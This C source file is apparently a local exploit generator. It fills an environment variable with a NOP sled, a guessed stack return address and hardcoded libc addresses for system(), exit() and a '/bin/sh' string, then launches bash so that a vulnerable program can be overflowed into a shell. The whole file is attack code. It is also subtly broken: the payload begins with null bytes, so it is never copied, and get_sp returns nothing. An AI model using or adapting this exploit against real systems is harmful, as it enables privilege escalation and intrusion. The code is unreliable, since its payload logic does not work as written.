#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/**
 * Example of inject c code
 * libc - system add : 0x7ffff7e2bcd0
 * libc - exit : 0x7ffff7e213c0
 * shell env : 0x7fffffffe01b
 */

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512
#define NOP 0x90

char shellcode[] =
    "\x00\x00\xd0\xbc\xe2\xf7\xff\x7f"  // system()
    "\x00\x00\xc0\x13\xe2\xf7\xff\x7f" // exit()
    "\x00\x00\x1b\xe0\xff\xff\xff\x7f"; // /bin/sh

unsigned long get_sp(void)
{
    __asm__("mov %rsp, %rax");
}

int main(int argc, char *argv[])
{
    char *buff, *ptr;
    long *addr_ptr, addr;
    int offset = DEFAULT_OFFSET, bsize = DEFAULT_BUFFER_SIZE;
    int i;

    if (argc > 1)
        bsize = atoi(argv[1]);
    if (argc > 2)
        offset = atoi(argv[2]);

    if (!(buff = malloc(bsize)))
    {
        printf("Can’t allocate memory.\n");
        exit(0);
    }

    addr = get_sp() - offset;
    printf("Using address : 0x%x\n", addr);
    ptr = buff;
    addr_ptr = (long *)ptr;
    for (i = 0; i < bsize; i += 4)
        *(addr_ptr++) = addr;
    for (i = 0; i < bsize / 2; i++)
        buff[i] = NOP;
    ptr = buff + ((bsize / 2) - (strlen(shellcode) / 2));
    for (i = 0; i < strlen(shellcode); i++)
        *(ptr++) = shellcode[i];
    buff[bsize - 1] = '\0';
    memcpy(buff, "BUF=", 4);
    putenv(buff);
    system("/bin/bash");
}